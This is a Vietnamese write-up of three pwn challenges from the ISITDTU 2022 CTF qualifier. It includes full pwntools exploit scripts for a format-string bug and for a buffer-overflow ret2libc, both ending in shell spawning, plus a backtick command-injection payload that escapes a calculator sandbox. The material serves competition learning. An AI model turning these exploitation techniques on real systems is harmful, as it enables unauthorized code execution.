# Writeup for ISITDTU QUAL 2022

---

#### Đôi lời muốn nói

Đây là lần thứ hai mình tham gia giải này với tư cách là thí sinh với team Sarmat, lần đầu mình tham gia là với team g4f năm ngoái, năm ngoái team mình cũng không gặt hái được gì nhiều nhưng năm nay đội mình đã chiến đấu hết mình và giành được giải 3 toàn Việt Nam và được 1 suất tham gia chung kết. 

Năm nay giải có vẻ nhẹ hơn so với năm ngoái (do mình cảm thấy vậy hoặc là do năm ngoái mình phế vì không giải được câu nào :d ), năm nay mình giải được 3 câu pwn và 3 câu mics và ở dưới là solution cho 3 câu mình pwn giải được. 

#### Pwn 

##### Pwn 1

###### Analyze 

Đây là một câu pwn binary elf 64-bits và không bị stripped thay vào đó thì full mitigation được bật. 

Vào fuzz linh tinh thì mình phát hiện ra có bug format string ngoài ra có vẻ bài này dính bug typecast do format là unsigned mà nó lấy trừ số ngẫu nhiên, nhập số nhỏ thì nhảy qua số âm ép lại %u thì ra typecast error nhưng mà có vẻ bug này không ảnh hưởng tới chương trình cho lắm nên có thể bỏ qua.

Bug duy nhất trong bài này chắc có lẽ là format string.

![](https://i.imgur.com/YxXvEhv.png)


###### Exploit 

Vector exploit bài này mình sẽ làm như sau: 

Địa chỉ con trỏ payler_money được gán với biến v3 (khởi tạo ở vùng heap thông qua hàm calloc() `v3 = (_QWORD **)calloc(0x88uLL, 1uLL);`), ta có thể lợi dụng bug format string để thay đổi fsb của nó thành biến `feedback`, bởi vì biến v3 được dùng ở trong hàm `playgame`, bên trong hàm `playgame` thì biến `my_money`(biến v3) được cộng trừ liên tục, ta có thể lợi dụng tính năng này để thay đổi giá trị của biến `feedback` (mà ta đã thay đổi `v3` thành `feedback` ở trước đó bằng format string, ta cộng trừ sao cho nó trỏ về địa chỉ của stack ta leak được từ bug format string rồi từ đó build rop chain để spawn shell. 

```py
from pwn import * 
from ctypes import CDLL
r = process('./warmup_patched')
# r = remote('34.171.160.79', 9998)
elf = context.binary = ELF('./warmup_patched')
libc = ELF('./libc-2.23.so')
libc_ = CDLL('./libc.so.6')
# --------------------------------------------------
# r.sendlineafter(b'How much money you want? ',b'0')
# payload = b'%p#'*100
# r.sendlineafter(b'name: ',payload)
# r.recvuntil(b'Welcome to lucky game                            *')
# r.recvuntil(b'**************************************************')
# leak = r.recvuntil(b'*').strip().split(b'#')
# print(leak)
# debug=1
# if debug:
#     i=1
#     for address in leak:
#         if  address.decode().startswith("0x5") and address.decode().endswith("6"):
#             log.info(f"main leak [{i}]: {address.decode()}")
#         elif len(address) > 16 and address.decode().endswith("00"):
#             log.info(f"Canary candidate [{i}]: {address.decode()}")
#         elif address.decode().startswith("0x7f"):
#             log.info(f"Libc candidate [{i}]: {address.decode()}")
#         elif address.decode().startswith("0x7f") and address.decode().endswith("0"):
#             log.info(f"Stack leak [{i}]: {address.decode()}")
#         elif len(address) > 8 and address.decode().startswith("0x3"):
#             log.info(f"Seed leak [{i}]: {address.decode()}")

#         i += 1
# -------------------------------------------
# | [*] Libc candidate [1]: 0x7f934f3316a3  |
# | [*] Seed leak [23]: 0x3ab2989b7         |  
# | [*] Stack candidate [26]: 0x7ffc38c62110|
# | [*] main leak [33]: 0x56364f6011b6      |
# -------------------------------------------
r.sendlineafter(b'How much money you want? ',b'0')

r.sendlineafter(b'name: ',b'%88c%12$hhn#%1$p#%23$p#%26$p#%33$p')
r.recvuntil(b'Welcome to lucky game                            *')
r.recvuntil(b'**************************************************')
leak = r.recvuntil(b'*').strip().split(b'#')
print(leak)
libc_leak = int(leak[1],16)
seed = int(leak[2],16)
stack_leak = int(leak[3],16)
main_leak = int(leak[4][:14],16)
print('libc leak: ',hex(libc_leak))
print('seed leak: ',hex(seed))
print('stack: ',hex(stack_leak))
print('pie leak: ',hex(main_leak))
# gdb.attach(r)
elf.address = main_leak - elf.sym['main']
libc.address = libc_leak - 0x3c56a3

print('-----------------------------')
print('pie base: ', hex(elf.address))
print('libc base: ',hex(libc.address))
# gdb.attach(r,gdbscript = '''
#     b *0x0055555540110C
#     b * playgame
#     continue
#     '''
# )
r.recvuntil(b'Your money: ')
money_leak  = int(r.recvline().strip())
print('money: ',hex(money_leak))
libc_.srand(seed)

value_moment = libc_.rand()
print('value at the moment: ',hex(value_moment))
forgery = (stack_leak + 8) - (libc_.rand() + money_leak)
r.sendlineafter(b'Your vote (= 0 to exit): ',str(forgery).encode())
r.sendlineafter(b'Your number: ',str(value_moment).encode())

rdi = elf.address + 0x0000000000001243
ret = elf.address + 0x00000000000009be
r.sendlineafter(b'Your vote (= 0 to exit):',b'0')
payload = p64(ret) + p64(rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.recvuntil(b'feeback:')
r.sendline(payload)
r.interactive()
``` 

Teammate của mình @th3_5had0w đã giải ra bài này ở trước đó, mình một lát sau mới giải ra được, solution ở bên dưới 
```python 
from pwn import * 


while (1):
    #io = process('./chal')
    io = remote('34.171.160.79', 9998) 
    elf = context.binary = ELF('./chal')
    libc = ELF('./libc.so.6')

    #gdb.attach(io, gdbscript='''
    #        b * playgame+125
    #''')

    io.sendlineafter(b'How much money you want? ',b'0')
    pl = b'%p'+b'%c'*8+b'%p%p'+b'%c'*7+b'%111c'+b'%hhn'+b'%14c'+b'%26$hhn'
    #io.sendlineafter(b'name: ',b'%11$p %p %9$p %20$hhn'+b'%24c'+b'%n')
    io.sendlineafter(b'name: ', pl)
    io.recvuntil(b'Welcome to lucky game                            *')
    io.recvuntil(b'*\n')
    libc.address = int(io.recv(14), 16) - 0x16a3 - 0x3c4000
    log.info('libc: '+hex(libc.address))
    io.recv(8)
    stack = int(io.recv(14), 16) + 0x30 + 0x18
    log.info('stack: '+hex(stack))
    elf.address = int(io.recv(14), 16) - 0xe95
    log.info('elf: '+hex(elf.address))
    io.recvuntil(b'*\n')
    io.sendlineafter(b'(= 0 to exit): ', b'0')
    io.sendafter(b'Send to author your feeback: ', b'hehe')
    io.recvuntil(b'Thank for your feedback\n')
    try:
        io.sendlineafter(b'How much money you want? ',b'0')
        og1 = libc.address + 0x45226
        og2 = libc.address + 0x4527a
        og3 = libc.address + 0xf03a4
        og4 = libc.address + 0xf1247
        log.info('og1: '+hex(og1))
        log.info('og2: '+hex(og2))
        log.info('og3: '+hex(og3))
        log.info('og4: '+hex(og4))
        #gdb.attach(io, gdbscript = '''
        #b * playgame+125
        #''')
        pl = b'%c'*18+b'%'+str((stack&0xff) - 18+1).encode('utf-8')+b'c'+b'%hhn'+b'%'+str(((og4>>8) & 0xffff) - 0xb9).encode('utf-8')+b'c'+b'%26$hn'
        io.sendlineafter(b'name: ', pl)
        io.interactive()
    except:
        io.close()
        io = 0
```

Cảm ơn anh @Cobra đã giúp mình giải được bài này :love_pepe:

#### Pwn 2

Ban đầu mình nghĩ đây là một câu binary pwn vì cho file elf 64-bits. Flow chương trình khá là đơn giản, nhập input vào rồi chương trình xử lý input mình nhập thông qua hàm `process()` sau đó ghi vào file `result.txt` thông qua hàm `writeResult()`, điều đặc biệt ở hàm này là nó chạy hàm `system(s)`. Lúc đầu mình thử exploit theo hướng `stack pivot` tại vì chương trình cho nhập input thông qua hàm `__isoc99_scanf("%112s", haystack)`, biến `haystack` được khởi tạo ban đầu với 100 bytes, nhưng sau khi bài up lên được 30p thì mình đã thấy có team giải được thì mình nghĩ theo một hướng khác đó là lợi dụng hàm `system(s)` để escape sandbox và đọc flag. 

##### Exploit

Bài này filter phần lớn các ký tự đặc biệt để exploit theo hướng sandbox `"~!@#%^&_=\\|[]{};:'\"?><,"`, tuy nhiên thì nó không filter ký tự ` . Dường như bài này chỉ là một cái máy tính đơn giản thực hiện một số phép cộng trừ, payload của mình khá là đơn giản 
``` 
1`sh`+1
```

![](https://i.imgur.com/YmbmZH3.png)


Vậy là mình đã escape được sandbox, tuy nhiên chúng ta chỉ thực hiện được một số command cơ bản như là ls, cat, etc,.....

![](https://i.imgur.com/3VMsNec.png)


Ta có thể confirm rằng ta đang ở directory chính thông qua file Docker. Tuy nhiên ta không thể xem được nội dung ở result.txt hay là flag.txt thông qua command cat. Tới đây thì có khá là nhiều cách để đọc nội dung của flag, cách của mình là gộp stdout vào stderr thông qua command `1>&2`, lợi dụng tính năng này để mình đọc được flag. 

![](https://i.imgur.com/VwIdgBh.png)


#### Re-name

Có vẻ đây là bài dễ nhất trong 4 bài pwn, chỉ là một câu bof leak libc rồi ta tính toán địa chỉ của libc gốc và từ đó build ROP chain để spawn shell

![](https://i.imgur.com/Zh0X2kA.png)


Bug bof nằm tại hàm `read(0, buf, 0x60uLL)` do biến buf được khởi tạo với 40 bytes. 

Một bài ăn điểm tại giải này 

```py
from pwn import * 

r = process('./challenge')
# r = remote('34.175.151.38',2682)
rdi = 0x0000000000401393
ret = 0x000000000040101a
elf = context.binary = ELF('./challenge')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.23.so')
payload = b'a'*0x38 + p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
r.sendlineafter(b'What is your name? ',payload)
r.sendline(b'\x00')
r.recvuntil(b'None!')
leak = u64(r.recvuntil(b'\x7f')[1:].ljust(8,b'\x00'))

print(hex(leak))
# gdb.attach(r)
libc.address = leak - libc.sym['puts']
print(hex(libc.address))
payload_ = b'a'*0x38 + p64(ret) + p64(rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.sendlineafter(b'What is your name? ',payload_)
r.interactive()
```



